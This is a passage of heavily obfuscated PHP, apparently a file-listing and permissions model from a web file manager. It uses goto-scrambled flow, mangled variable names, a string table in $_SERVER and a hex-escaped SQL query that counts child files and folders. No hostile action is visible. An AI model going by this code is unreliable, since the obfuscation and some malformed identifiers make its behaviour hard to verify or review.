array($Eƒ¤»¡¤­Å[409], $EéÀÆÄÛå¹))); } $cñ®İäé‹¿ = array_to_keyvalue($cñ®İäé‹¿[$Eƒ¤»¡¤­Å[370]], $Eƒ¤»¡¤­Å[394]); goto Cõ¼ÉÜÄ—Õ; dïù™Óõ¼—: $Eƒ¤»¡¤­Å =& $_SERVER[åÌÛ»ô¢‚ö™]; $fÃß¯¯‡ = Model($Eƒ¤»¡¤­Å[406])->listData(); $EéÀÆÄÛå¹ = array_filter_by_field($fÃß¯¯‡, $Eƒ¤»¡¤­Å[29], $Eƒ¤»¡¤­Å[407]); goto F”ˆ›ƒ‘“; e‘Œ—ÙÓ¼§: } public function listUserTag($DØˆÃâÜƒœ) { goto dñ×Ê‰“å«; bÍÎßÜ®‡: if ($e×„ÎÁ½Ÿ´) { Model($B®ßªöÛê´[419])->removeBySource($e×„ÎÁ½Ÿ´); } return $eòêé…íœ; goto F¾áÓ¼˜Š¤; dñ×Ê‰“å«: $B®ßªöÛê´ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($DØˆÃâÜƒœ && !is_array($DØˆÃâÜƒœ)) { $DØˆÃâÜƒœ = array($DØˆÃâÜƒœ); } $BĞ„‘…«îÍ = Model($B®ßªöÛê´[417])->listData(); goto EŒÜÏ¢§î; EŒÜÏ¢§î: $Câ‡ùåæôî = array(); foreach ($BĞ„‘…«îÍ as $b¹‡“½ÕÜŸ) { $Aï½Ï“ÊÕ = $b¹‡“½ÕÜŸ[$B®ßªöÛê´[75]]; if (!$Aï½Ï“ÊÕ) { continue; } if (!isset($Câ‡ùåæôî[$Aï½Ï“ÊÕ])) { $Câ‡ùåæôî[$Aï½Ï“ÊÕ] = array(); } $Câ‡ùåæôî[$Aï½Ï“ÊÕ][] = $b¹‡“½ÕÜŸ[$B®ßªöÛê´[418]]; } $F†‹ïïö´Ä = array(); goto fÚõ©ö™¼; F¨¬†‡ßÕ: $DÑ…¤†Ç· = array_to_keyvalue($eòêé…íœ[$B®ßªöÛê´[73]], $B®ßªöÛê´[33], $B®ßªöÛê´[394]); $fØÍ®Ó·ø¢ = array_merge($DÑ…¤†Ç·, $DØè±øÀñé); foreach ($F†‹ïïö´Ä as $Aï½Ï“ÊÕ) { if (!in_array($Aï½Ï“ÊÕ, $fØÍ®Ó·ø¢)) { $e×„ÎÁ½Ÿ´[] = $Aï½Ï“ÊÕ; } } goto bÍÎßÜ®‡; Dµ“ö·À©ï: if (!$eòêé…íœ || count($F†‹ïïö´Ä) == $eòêé…íœ[$B®ßªöÛê´[367]][$B®ßªöÛê´[368]]) { return $eòêé…íœ; } $e×„ÎÁ½Ÿ´ = array(); $DØè±øÀñé = array_to_keyvalue($eòêé…íœ[$B®ßªöÛê´[74]], $B®ßªöÛê´[33], $B®ßªöÛê´[394]); goto F¨¬†‡ßÕ; fÚõ©ö™¼: foreach ($Câ‡ùåæôî as $d‚Õ­‘á¸ => $E÷à”Òäõ) { $DêÃÔ­½†Á = !0; if (!$DØˆÃâÜƒœ) { $F†‹ïïö´Ä[] = $d‚Õ­‘á¸; continue; } foreach ($DØˆÃâÜƒœ as $D³ãù¶ ¬¾) { if (!in_array($D³ãù¶ ¬¾, $E÷à”Òäõ)) { $DêÃÔ­½†Á = !1; break; } } if ($DêÃÔ­½†Á) { $F†‹ïïö´Ä[] = $d‚Õ­‘á¸; } } if (!$F†‹ïïö´Ä) { return array(); } $eòêé…íœ = $this->listSource(array($B®ßªöÛê´[408] => array($B®ßªöÛê´[409], $F†‹ïïö´Ä))); goto Dµ“ö·À©ï; F¾áÓ¼˜Š¤: } public function listUserRecycle() { $c¢¢ÒáË =& $_SERVER[åÌÛ»ô¢‚ö™]; $Aò´øÙ‡Ûë = Model($c¢¢ÒáË[420])->listData(); if (!$Aò´øÙ‡Ûë) { return array(); } $fø¥Ú°ì§ = array($c¢¢ÒáË[408] => array($c¢¢ÒáË[409], $Aò´øÙ‡Ûë), $c¢¢ÒáË[421] => 1); return $this->listSource($fø¥Ú°ì§); } public function listSource($CÁë°¦¶ÌÇ, $cÊŞÒ‘èšÁ = 3000) { goto Bôä¬œÔ”ö; CùğëÀµÏâ: $fÏŒ‹áˆ× = $this->field($F½ˆÔé¹äó)->_makeOrder()->where($CÁë°¦¶ÌÇ)->selectPage($cÊŞÒ‘èšÁ); $this->_listDataApply($fÏŒ‹áˆ×[$A„„÷²ñ”°[370]]); $this->_listMake($fÏŒ‹áˆ×); goto aÙæËøöã ; aÙæËøöã : return $fÏŒ‹áˆ×; goto fˆâÌ…ƒí³; Bôä¬œÔ”ö: $A„„÷²ñ”° =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!isset($CÁë°¦¶ÌÇ[$A„„÷²ñ”°[422]])) { $CÁë°¦¶ÌÇ[$A„„÷²ñ”°[422]] = 0; } $F½ˆÔé¹äó = $A„„÷²ñ”°[423]; goto CùğëÀµÏâ; fˆâÌ…ƒí³: } protected function _makeOrder() { goto B¿‡åİÃÂ‚; cÆ Ñ´¤Õò: $A¯İª‡‡Í¸ = Input::get($D§¨É·š[433], $D§¨É·š[7], $C…’ áòğİ, array_keys($BäÀó†äÈ)); if (!in_array($FïÜ§®¥ª¦, array_keys($bâ½·ÔÇÃÇ))) { $FïÜ§®¥ª¦ = $D§¨É·š[28]; } if (!in_array($A¯İª‡‡Í¸, array_keys($BäÀó†äÈ))) { $FïÜ§®¥ª¦ = $D§¨É·š[427]; } goto Bó¨ß•Ò¿Ã; B¿‡åİÃÂ‚: $D§¨É·š =& $_SERVER[åÌÛ»ô¢‚ö™]; $f¾ŸÎ¶ïá = Model($D§¨É·š[424])->get($D§¨É·š[425]); $C…’ áòğİ = Model($D§¨É·š[424])->get($D§¨É·š[426]); goto A÷£…á´Æ; Bó¨ß•Ò¿Ã: if ($FïÜ§®¥ª¦ == $D§¨É·š[28]) { } $DŞö‹œ¼©È = $D§¨É·š[434] . $bâ½·ÔÇÃÇ[$FïÜ§®¥ª¦] . $D§¨É·š[50] . $BäÀó†äÈ[$A¯İª‡‡Í¸]; return $this->order(rtrim(trim($DŞö‹œ¼©È), $D§¨É·š[47])); goto C¨Æ®öÉğ; A÷£…á´Æ: $BäÀó†äÈ = array($D§¨É·š[427] => $D§¨É·š[428], $D§¨É·š[429] => $D§¨É·š[430]); $bâ½·ÔÇÃÇ = array($D§¨É·š[28] => $D§¨É·š[28], $D§¨É·š[77] => $D§¨É·š[77], $D§¨É·š[165] => $D§¨É·š[397], $D§¨É·š[403] => $D§¨É·š[403], $D§¨É·š[431] => $D§¨É·š[404], $D§¨É·š[200] => $D§¨É·š[200], $D§¨É·š[107] => $D§¨É·š[107]); $FïÜ§®¥ª¦ = Input::get($D§¨É·š[432], $D§¨É·š[7], $f¾ŸÎ¶ïá, array_keys($bâ½·ÔÇÃÇ)); goto cÆ Ñ´¤Õò; C¨Æ®öÉğ: } protected function _listDataApplyItem($F„´œÌµ¯Ì, $F½§³¯íõ± = false) { $c³ŸêÔó = array($F„´œÌµ¯Ì); $this->_listDataApply($c³ŸêÔó, $F½§³¯íõ±); return $c³ŸêÔó[0]; } protected function _listDataApply(&$A£ãƒ†¸ò§, $AæŒœ¼é­ = false) { goto D˜š‹Ã­Ò; D˜š‹Ã­Ò: $Eªïé–™ä÷ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$A£ãƒ†¸ò§) { $A£ãƒ†¸ò§ = array(); return; } $B¿¦¦¥Æ—Ê = array_to_keyvalue($A£ãƒ†¸ò§, $Eªïé–™ä÷[33], $Eªïé–™ä÷[394]); goto d¾ºèÖ†œ²; aŠèÓ‰×: $this->_listAppendPath($A£ãƒ†¸ò§); $this->_listAppendAuth($A£ãƒ†¸ò§); $this->_listAppendSourceInfo($A£ãƒ†¸ò§, $B¿¦¦¥Æ—Ê); goto dŠ‡ö‡¹·•; dŠ‡ö‡¹·•: $this->_listAppendUser($A£ãƒ†¸ò§); $this->_listFilterInfo($A£ãƒ†¸ò§, $AæŒœ¼é­); goto fÍ¹²è×¨; d¾ºèÖ†œ²: $B¿¦¦¥Æ—Ê = array_unique($B¿¦¦¥Æ—Ê); $this->_listSourceCache($A£ãƒ†¸ò§); if (!$AæŒœ¼é­) { $this->_listAppendMeta($A£ãƒ†¸ò§, $B¿¦¦¥Æ—Ê); $this->_listAppendFileMeta($A£ãƒ†¸ò§, $B¿¦¦¥Æ—Ê); $this->_listAppendChildren($A£ãƒ†¸ò§, $B¿¦¦¥Æ—Ê); } goto aŠèÓ‰×; fÍ¹²è×¨: } protected function _listSourceCache($cğ‚ÃšÎ) { $eÜ…Ä©Ü =& $_SERVER[åÌÛ»ô¢‚ö™]; foreach ($cğ‚ÃšÎ as $B¬–‡ÚÑ) { self::$cacheSourceInfo[$eÜ…Ä©Ü[435] . $B¬–‡ÚÑ[$eÜ…Ä©Ü[394]]] = $B¬–‡ÚÑ; } } protected function _listFilterInfo(&$c§¶‰Ü›æ­, $BÆ©ŞŞø × = false) { $dâöœ‹‹„‹ =& $_SERVER[åÌÛ»ô¢‚ö™]; foreach ($c§¶‰Ü›æ­ as &$bÛÖô É†) { $bÛÖô É† = $this->pathInfoFilter($bÛÖô É†); self::$cachePathInfo[$dâöœ‹‹„‹[436] . intval($BÆ©ŞŞø ×) . $dâöœ‹‹„‹[437] . $bÛÖô É†[$dâöœ‹‹„‹[394]]] = $bÛÖô É†; } unset($bÛÖô É†); } protected function _listMake(&$aÍ®·’ùé‚) { $cíÚÅÁÔÜ =& $_SERVER[åÌÛ»ô¢‚ö™]; $aÍ®·’ùé‚[$cíÚÅÁÔÜ[74]] = array(); $aÍ®·’ùé‚[$cíÚÅÁÔÜ[73]] = array(); foreach ($aÍ®·’ùé‚[$cíÚÅÁÔÜ[370]] as $F…Š…ªÛÇ) { $C¿İë×Ö¿Ì = $F…Š…ªÛÇ[$cíÚÅÁÔÜ[395]] == 1 ? $cíÚÅÁÔÜ[74] : $cíÚÅÁÔÜ[73]; $aÍ®·’ùé‚[$C¿İë×Ö¿Ì][] = $F…Š…ªÛÇ; } unset($aÍ®·’ùé‚[$cíÚÅÁÔÜ[370]]); } protected function _listAppendMeta(&$Cä÷ÃïîÛğ, $bá¢›É‡Æ) { goto eí’å ‡¨›; D‘²ÜŸ¤×: if (!$CÉ¨àõ¢ŒÉ) { return; } $CÑóì·•ø = array($Fá Åï°[440], $Fá Åï°[441]); $c¤¸‘¬Âé” = array(); goto BáñŠµèÏò; eí’å ‡¨›: $Fá Åï° =& $_SERVER[åÌÛ»ô¢‚ö™]; $cÕ‚ö“º© = array($Fá Åï°[408] => array($Fá Åï°[409], $bá¢›É‡Æ)); $CÉ¨àõ¢ŒÉ = Model($Fá Åï°[438])->field($Fá Åï°[439])->where($cÕ‚ö“º©)->select(); goto D‘²ÜŸ¤×; BáñŠµèÏò: foreach ($CÉ¨àõ¢ŒÉ as $d¿Å’Œ…ãŸ) { if (!isset($c¤¸‘¬Âé”[$d¿Å’Œ…ãŸ[$Fá Åï°[394]]])) { $c¤¸‘¬Âé”[$d¿Å’Œ…ãŸ[$Fá Åï°[394]]] = array(); } if (in_array($d¿Å’Œ…ãŸ[$Fá Åï°[89]], $CÑóì·•ø)) { continue; } $c¤¸‘¬Âé”[$d¿Å’Œ…ãŸ[$Fá Åï°[394]]][$d¿Å’Œ…ãŸ[$Fá Åï°[89]]] = $d¿Å’Œ…ãŸ[$Fá Åï°[375]]; } foreach ($Cä÷ÃïîÛğ as &$Då÷ä –ˆö) { $Då÷ä –ˆö[$Fá Åï°[442]] = !1; if (isset($c¤¸‘¬Âé”[$Då÷ä –ˆö[$Fá Åï°[394]]])) { $Då÷ä –ˆö[$Fá Åï°[442]] = $c¤¸‘¬Âé”[$Då÷ä –ˆö[$Fá Åï°[394]]]; } if ($this->fileIsLock($Då÷ä –ˆö) && $Då÷ä –ˆö[$Fá Åï°[401]]) { $a¾–Ò¨ ø = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Då÷ä –ˆö[$Fá Åï°[401]][$Fá Åï°[402]] = AuthModel::authDisable($Då÷ä –ˆö[$Fá Åï°[401]][$Fá Åï°[402]], $a¾–Ò¨ ø); $Då÷ä –ˆö[$Fá Åï°[401]][$Fá Åï°[443]][$Fá Åï°[401]] = $Då÷ä –ˆö[$Fá Åï°[401]][$Fá Åï°[402]]; } } unset($Då÷ä –ˆö); goto a©…­ÊŒë; a©…­ÊŒë: } protected function _listAppendFileMeta(&$eø”æÍªÕ, $b‡‹„«Á–Ã) { goto D„¢ç´½ãè; D„¢ç´½ãè: $A¼Û©Ş¥É =& $_SERVER[åÌÛ»ô¢‚ö™]; $D˜ŒÎ›‡ö§ = array_to_keyvalue($eø”æÍªÕ, $A¼Û©Ş¥É[33], $A¼Û©Ş¥É[444]); $D˜ŒÎ›‡ö§ = array_filter(array_unique($D˜ŒÎ›‡ö§)); goto a•×©œïó; a•×©œïó: if (!$D˜ŒÎ›‡ö§) { return; } $eÃ°İš¹İ = array($A¼Û©Ş¥É[445] => array($A¼Û©Ş¥É[409], $D˜ŒÎ›‡ö§)); $bµ¤ÅÕñè = $A¼Û©Ş¥É[446]; goto a„ÀªÈ—ê‚; e›­×›ˆñ: foreach ($eø”æÍªÕ as &$b¤äÖŒ«¼) { goto cä£Õ²—‚‘; cä£Õ²—‚‘: $B°×„î‘Î¥ = $b¤äÖŒ«¼[$A¼Û©Ş¥É[444]]; if (!$B°×„î‘Î¥ || !isset($eª‚¼œóøÂ[$B°×„î‘Î¥])) { continue; } $A’‡ºëØ™æ = $eª‚¼œóøÂ[$B°×„î‘Î¥]; goto dÆ‰ŒÖÖÕ‚; fñêÄÈ®Ù: unset($eª‚¼œóøÂ[$B°×„î‘Î¥][$A¼Û©Ş¥É[75]]); $eĞä°©”¤Å = is_array($fø”‚šÇ‡˜[$B°×„î‘Î¥]) ? $fø”‚šÇ‡˜[$B°×„î‘Î¥] : array(); $b¤äÖŒ«¼[$A¼Û©Ş¥É[161]] = array_merge($eĞä°©”¤Å, $eª‚¼œóøÂ[$B°×„î‘Î¥]); goto bô”­†…Ùí; dÆ‰ŒÖÖÕ‚: $A’‡ºëØ™æ[$A¼Û©Ş¥É[77]] = $b¤äÖŒ«¼[$A¼Û©Ş¥É[77]]; $A’‡ºëØ™æ[$A¼Û©Ş¥É[28]] = $b¤äÖŒ«¼[$A¼Û©Ş¥É[28]]; if (!isset(self::$cacheFileInfo[$A¼Û©Ş¥É[450] . $B°×„î‘Î¥])) { self::$cacheFileInfo[$A¼Û©Ş¥É[450] . $B°×„î‘Î¥] = array_merge(array(), $A’‡ºëØ™æ); } goto fñêÄÈ®Ù; bô”­†…Ùí: if (isset($b¤äÖŒ«¼[$A¼Û©Ş¥É[161]][$A¼Û©Ş¥É[160]])) { $b¤äÖŒ«¼[$A¼Û©Ş¥É[160]] = json_decode($b¤äÖŒ«¼[$A¼Û©Ş¥É[161]][$A¼Û©Ş¥É[160]], !0); unset($b¤äÖŒ«¼[$A¼Û©Ş¥É[161]][$A¼Û©Ş¥É[160]]); } goto d”ìíĞÁ²; d”ìíĞÁ²: } unset($b¤äÖŒ«¼); goto Bï§Ü©ó‡ã; a„ÀªÈ—ê‚: $eª‚¼œóøÂ = Model($A¼Û©Ş¥É[447])->field($bµ¤ÅÕñè)->where($eÃ°İš¹İ)->select(); $eª‚¼œóøÂ = array_to_keyvalue($eª‚¼œóøÂ, $A¼Û©Ş¥É[444]); $D¾…†çô = Model($A¼Û©Ş¥É[448])->field($A¼Û©Ş¥É[449])->where($eÃ°İš¹İ)->select(); goto a½à°ŠÛ´õ; a½à°ŠÛ´õ: $D¾…†çô = $D¾…†çô ? $D¾…†çô : array(); $fø”‚šÇ‡˜ = array(); foreach ($D¾…†çô as $CØã©±Ëí) { if (!isset($fø”‚šÇ‡˜[$CØã©±Ëí[$A¼Û©Ş¥É[444]]])) { $fø”‚šÇ‡˜[$CØã©±Ëí[$A¼Û©Ş¥É[444]]] = array(); } $fø”‚šÇ‡˜[$CØã©±Ëí[$A¼Û©Ş¥É[444]]][$CØã©±Ëí[$A¼Û©Ş¥É[89]]] = $CØã©±Ëí[$A¼Û©Ş¥É[375]]; } goto e›­×›ˆñ; Bï§Ü©ó‡ã: } protected function _listAppendSourceInfo(&$A¶Á³‘ôœ‹, $A¾ø¶¡¹¾›) { goto C×Â”Æ¦½ø; C×Â”Æ¦½ø: $Fî³Õ˜ŒÕŞ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!defined($Fî³Õ˜ŒÕŞ[451])) { return; } $f‘©Æ‹» ï = Model($Fî³Õ˜ŒÕŞ[452])->listData(); goto d´µä«ŠŸ¼; F¢¼‰‡ì: $eÆ›¼·Êğ = array_to_keyvalue_group($c¯öÎ°ŒÎ°, $Fî³Õ˜ŒÕŞ[394]); foreach ($A¶Á³‘ôœ‹ as &$cŠçŒ´±™) { $cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[416]] = array($Fî³Õ˜ŒÕŞ[454] => 0, $Fî³Õ˜ŒÕŞ[455] => 0, $Fî³Õ˜ŒÕŞ[456] => 0); if (isset($D„¼×ë¼÷[$cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[394]]])) { $cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[416]][$Fî³Õ˜ŒÕŞ[457]] = 1; $cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[416]][$Fî³Õ˜ŒÕŞ[458]] = $D„¼×ë¼÷[$cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[394]]][$Fî³Õ˜ŒÕŞ[28]]; } if (isset($Aº¸Ê…™„­[$cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[394]]])) { $cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[416]][$Fî³Õ˜ŒÕŞ[459]] = array(); foreach ($Aº¸Ê…™„­[$cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[394]]] as $AÎóğê…ùË) { $c±˜ŒÎÁÄ  = $f½èÆôŠ×[$AÎóğê…ùË]; $cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[416]][$Fî³Õ˜ŒÕŞ[459]][] = array($Fî³Õ˜ŒÕŞ[460] => $c±˜ŒÎÁÄ [$Fî³Õ˜ŒÕŞ[392]], $Fî³Õ˜ŒÕŞ[411] => $c±˜ŒÎÁÄ [$Fî³Õ˜ŒÕŞ[28]], $Fî³Õ˜ŒÕŞ[461] => $c±˜ŒÎÁÄ [$Fî³Õ˜ŒÕŞ[462]]); } } if (isset($eÆ›¼·Êğ[$cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[394]]])) { $cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[416]][$Fî³Õ˜ŒÕŞ[463]] = array(); foreach ($eÆ›¼·Êğ[$cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[394]]] as $d‰»í‚¥‚´) { $cŠçŒ´±™[$Fî³Õ˜ŒÕŞ[416]][$Fî³Õ˜ŒÕŞ[463]] = array($Fî³Õ˜ŒÕŞ[464] => $d‰»í‚¥‚´[$Fî³Õ˜ŒÕŞ[465]], $Fî³Õ˜ŒÕŞ[466] => $d‰»í‚¥‚´[$Fî³Õ˜ŒÕŞ[467]], $Fî³Õ˜ŒÕŞ[468] => $d‰»í‚¥‚´[$Fî³Õ˜ŒÕŞ[394]], $Fî³Õ˜ŒÕŞ[469] => $d‰»í‚¥‚´[$Fî³Õ˜ŒÕŞ[470]], $Fî³Õ˜ŒÕŞ[471] => $d‰»í‚¥‚´[$Fî³Õ˜ŒÕŞ[472]], $Fî³Õ˜ŒÕŞ[473] => $d‰»í‚¥‚´[$Fî³Õ˜ŒÕŞ[473]], $Fî³Õ˜ŒÕŞ[474] => $d‰»í‚¥‚´[$Fî³Õ˜ŒÕŞ[474]]); } } } unset($cŠçŒ´±™); goto dƒä¿¸«±; bÆÜ›–ä²Ô: $f½èÆôŠ× = array_to_keyvalue($f‘©Æ‹» ï, $Fî³Õ˜ŒÕŞ[392]); $Aº¸Ê…™„­ = array_to_keyvalue_group($Bâ½…™ìÅİ, $Fî³Õ˜ŒÕŞ[75], $Fî³Õ˜ŒÕŞ[418]); $D„¼×ë¼÷ = array_to_keyvalue($féƒÚ·†¾, $Fî³Õ˜ŒÕŞ[75]); goto F¢¼‰‡ì; d´µä«ŠŸ¼: $Bâ½…™ìÅİ = Model($Fî³Õ˜ŒÕŞ[417])->listData(); $féƒÚ·†¾ = Model($Fî³Õ˜ŒÕŞ[406])->listData(); $c¯öÎ°ŒÎ° = Model($Fî³Õ˜ŒÕŞ[453])->listSimple(); goto bÆÜ›–ä²Ô; dƒä¿¸«±: return $A¶Á³‘ôœ‹; goto cŒÚ‘Æ¥’; cŒÚ‘Æ¥’: } protected function _listAppendChildren(&$dö­Ó‡¨¾Ï, $aÊã¸×Äêˆ) { goto fÎ¨ºóó„; e¦” šù©œ: $F–ˆ«†îÑº = $this->tablePrefix . $this->tableName; for ($FÁÕïçƒÂ = 0; $FÁÕïçƒÂ < $Bª¶®—©Ô; $FÁÕïçƒÂ++) { $eŒ‚÷ Œ¦ = intval($dö­Ó‡¨¾Ï[$FÁÕïçƒÂ][$bÊÀŒáßò³[422]]); if ($dö­Ó‡¨¾Ï[$FÁÕïçƒÂ][$bÊÀŒáßò³[395]]) { $DØš£à–ğš = $dö­Ó‡¨¾Ï[$FÁÕïçƒÂ][$bÊÀŒáßò³[394]]; $Cäô†›š…ù .= "\x53\x45\x4c\x45\103\x54\x20\52\40\x46\x52\117\x4d\40\50\123\105\114\x45\103\x54\40\47{$DØš£à–ğš}\x5f\150\x61\163\x46\151\154\x65\47\40\x61\163\40\x68\141\x73\x2c\143\157\x75\x6e\164\50\61\x29\40\141\x73\x20\x68\x61\x73\x43\x6f\x75\x6e\x74\x20\x46\122\117\x4d\40\x60{$F–ˆ«†îÑº}\140\40\12\x9\11\11\x9\11\167\x68\x65\x72\x65\x20\x70\141\x72\x65\x6e\x74\111\x44\75{$DØš£à–ğš}\x20\x61\x6e\144\x20\151\163\x46\x6f\x6c\144\x65\x72\75\60\40\x61\x6e\x64\x20\x69\163\x44\x65\x6c\145\164\145\x3d{$eŒ‚÷ Œ¦}\x29\x20\141\x73\40\x74\142\x31\137{$DØš£à–ğš}\40\x75\x6e\x69\x6f\x6e\x20\141\154\154\x20\12\11\x9\x9\11\x9\123\105\x4c\105\103\124\40\x2a\x20\x46\122\x4f\115\40\x28\x53\105\x4c\105\x43\x54\40\47{$DØš£à–ğš}\137\x68\141\163\106\x6f\x6c\144\x65\x72\x27\x20\x61\163\40\x68\x61\163\x46\151\154\145\x2c\143\157\165\156\x74\50\x31\51\40\x61\x73\40\150\x61\x73\x43\157\x75\156\x74\40\106\122\117\115\x20\140{$F–ˆ«†îÑº}\140\40\xa\11\11\x9\11\11\x77\x68\x65\162\x65\40\160\141\x72\145\x6e\x74\111\104\x3d{$DØš£à–ğš}\x20\141\x6e\144\x20\151\x73\x46\157\x6c\x64\x65\x72\75\x31\40\141\x6e\144\x20\151\163\104\145\154\145\x74\145\x3d{$eŒ‚÷ Œ¦}\x29\x20\141\x73\x20\164\x62\62\137{$DØš£à–ğš}\40\x75\x6e\151\157\156\x20\141\154\154\40"; } if ((strlen($Cäô†›š…ù) >= $fÃ„öÈÄŒ || $FÁÕïçƒÂ == $Bª¶®—©Ô - 1) && $Cäô†›š…ù) { $Cäô†›š…ù = substr($Cäô†›š…ù, 0, -strlen($bÊÀŒáßò³[475])); $càĞØß’óŒ = $this->query($Cäô†›š…ù); $BÉßí¬ÓÂ° = array_merge($BÉßí¬ÓÂ°, $càĞØß’óŒ); $Cäô†›š…ù = $bÊÀŒáßò³[33]; } } $BÉßí¬ÓÂ° = array_to_keyvalue($BÉßí¬ÓÂ°, $bÊÀŒáßò³[476]); goto c„§´ŠçÖÕ; c„§´ŠçÖÕ: foreach ($dö­Ó‡¨¾Ï as &$a¼á°‹‚ø) { if ($a¼á°‹‚ø[$bÊÀŒáßò³[395]]) { unset($a¼á°‹‚ø[$bÊÀŒáßò³[397]]); $a¼á°‹‚ø[$bÊÀŒáßò³[210]] = intval($BÉßí¬ÓÂ°[$a¼á°‹‚ø[$bÊÀŒáßò³[394]] . $bÊÀŒáßò³[477]][$bÊÀŒáßò³[478]]); $a¼á°‹‚ø[$bÊÀŒáßò³[209]] = intval($BÉßí¬ÓÂ°[$a¼á°‹‚ø[$bÊÀŒáßò³[394]] . $bÊÀŒáßò³[479]][$bÊÀŒáßò³[478]]); } } unset($a¼á°‹‚ø); goto aˆ›ïºÅ»í; fÎ¨ºóó„: $bÊÀŒáßò³ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Cäô†›š…ù = $bÊÀŒáßò³[377]; $BÉßí¬ÓÂ° = array(); goto fšî‚–”Ùê; fšî‚–”Ùê: $fÃ„öÈÄŒ = 1024 * 50; $dö­Ó‡¨¾Ï = is_array($dö­Ó‡¨¾Ï) ? $dö­Ó‡¨¾Ï : array(); $Bª¶®—©Ô = count($dö­Ó‡¨¾Ï); goto e¦” šù©œ; aˆ›ïºÅ»í: } protected function _listAppendAuth(&$cÂ‚ÀæÇ­Œ) { goto cõÂù‰Ş’; aÆ¢Ñ‹®: foreach ($cÂ‚ÀæÇ­Œ as $Aåê‰óÊº) { if ($Aåê‰óÊº[$D«šºî¦[396]] == self::TYPE_GROUP) { $f¦®ĞˆÑŠå[] = $Aåê‰óÊº[$D«šºî¦[394]]; } } if (!$f¦®ĞˆÑŠå) { return; } $f”øÖ¼‘Ê = array_to_keyvalue($cÂ‚ÀæÇ­Œ, $D«šºî¦[394]); goto AÙŸÏªçÇ§; AÙŸÏªçÇ§: $AŠÀÄÂ¯Ë = Model($D«šºî¦[480])->getSourceList($f¦®ĞˆÑŠå, $f”øÖ¼‘Ê); foreach ($cÂ‚ÀæÇ­Œ as $F„˜©àÙ„ => &$Aåê‰óÊº) { $Aåê‰óÊº[$D«šºî¦[401]] = $AŠÀÄÂ¯Ë[$Aåê‰óÊº[$D«šºî¦[394]]]; if (!$Aåê‰óÊº[$D«šºî¦[401]] && $Aåê‰óÊº[$D«šºî¦[396]] == self::TYPE_GROUP) { $Aåê‰óÊº[$D«šºî¦[401]] = Action($D«šºî¦[481])->pathGroupAuthMake($Aåê‰óÊº[$D«šºî¦[482]]); if (!$Aåê‰óÊº[$D«šºî¦[401]] && !_get($GLOBALS, $D«šºî¦[483])) { $Aåê‰óÊº[$D«šºî¦[202]] = !1; $Aåê‰óÊº[$D«šºî¦[201]] = !1; } } if ($Aåê‰óÊº[$D«šºî¦[401]]) { $Aåê‰óÊº[$D«šºî¦[202]] = AuthModel::authCheckEdit($Aåê‰óÊº[$D«šºî¦[401]][$D«šºî¦[402]]); $Aåê‰óÊº[$D«šºî¦[201]] = AuthModel::authCheckView($Aåê‰óÊº[$D«šºî¦[401]][$D«šºî¦[402]]); } $this->groupPathDisplay($Aåê‰óÊº); } unset($Aåê‰óÊº); goto eåÎÈÊØ­õ; cõÂù‰Ş’: $D«šºî¦ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!defined($D«šºî¦[451])) { return; } $f¦®ĞˆÑŠå = array(); goto aÆ¢Ñ‹®; eåÎÈÊØ­õ: } public function groupPathDisplay(&$F²½†çÊÂ) { goto EĞÊ·‚Àé; EĞÊ·‚Àé: $F½—áÌÒ¼„ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($F²½†çÊÂ[$F½—áÌÒ¼„[396]] != self::TYPE_GROUP) { return; } $e¯š¬İò¹Š = Model($F½—áÌÒ¼„[484])->getInfo($F²½†çÊÂ[$F½—áÌÒ¼„[482]]); goto fĞ‡ó© ŒÛ; CÏœœÄè: $F²½†çÊÂ[$F½—áÌÒ¼„[490]] = $Cò÷‰š . $e¯š¬İò¹Š[$F½—áÌÒ¼„[416]][$F½—áÌÒ¼„[394]]; goto e¥å°ÏÌ¢“; BÏ²Û›“Ğ²: $F²½†çÊÂ[$F½—áÌÒ¼„[486]] = $e¯š¬İò¹Š[$F½—áÌÒ¼„[487]]; $F²½†çÊÂ[$F½—áÌÒ¼„[405]] = $e¯š¬İò¹Š[$F½—áÌÒ¼„[485]]; $F²½†çÊÂ[$F½—áÌÒ¼„[488]] = $e¯š¬İò¹Š[$F½—áÌÒ¼„[489]]; goto CÏœœÄè; fĞ‡ó© ŒÛ: $F½Í”î¦» = $this->parentLevelArray($e¯š¬İò¹Š[$F½—áÌÒ¼„[485]]); $Cò÷‰š = $F½—áÌÒ¼„[33]; foreach ($F½Í”î¦» as $bŒ …ÛñŒ‰) { $eäù…º‹Ş¡ = Model($F½—áÌÒ¼„[484])->getInfo($bŒ …ÛñŒ‰); $Cò÷‰š .= $eäù…º‹Ş¡[$F½—áÌÒ¼„[416]][$F½—áÌÒ¼„[394]] . $F½—áÌÒ¼„[47]; } goto BÏ²Û›“Ğ²; e¥å°ÏÌ¢“: } protected function _listAppendPath(&$BíŠŞ­¬Øî) { goto ešÇ®¸ ½º; b¼·ƒšÓ¼Á: $F…å—áæÂ¹ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($BíŠŞ­¬Øî as &$c¼ĞÌ¬Õ»Ÿ) { goto A·”ÜÔ÷–³; A·”ÜÔ÷–³: $fÜØ²ªˆ«¾ = $this->parentLevelArray($c¼ĞÌ¬Õ»Ÿ[$eëÑ’ğ¾“š[485]]); $bÉŞë®‰è­ = $this->_listAppendPathRoot($c¼ĞÌ¬Õ»Ÿ, $fÜØ²ªˆ«¾); foreach ($fÜØ²ªˆ«¾ as $B‹Âªˆ½Ş => $e‰Ÿ™´á¹•) { if ($B‹Âªˆ½Ş == 0 && $bÉŞë®‰è­ && 